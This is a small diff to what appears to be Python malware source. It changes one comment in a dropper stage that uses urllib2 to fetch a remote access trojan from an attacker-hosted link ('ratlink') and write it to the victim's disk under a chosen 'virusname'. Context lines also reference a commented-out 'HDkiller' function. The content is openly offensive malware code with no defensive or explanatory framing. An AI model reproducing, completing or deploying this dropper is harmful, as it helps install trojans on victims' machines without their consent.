@@ -42,7 +42,7 @@ def HDkiller():
 #HDkiller()
 #
 
-df = urllib2.urlopen(ratlink) #your site hosting the rat or whatever file u want to upload into victim
+df = urllib2.urlopen(ratlink) #your site hosting the rat or whatever file u want to download into victim
 output = open(virusname,"wb")
 output.write(df.read()) 
 output.close()
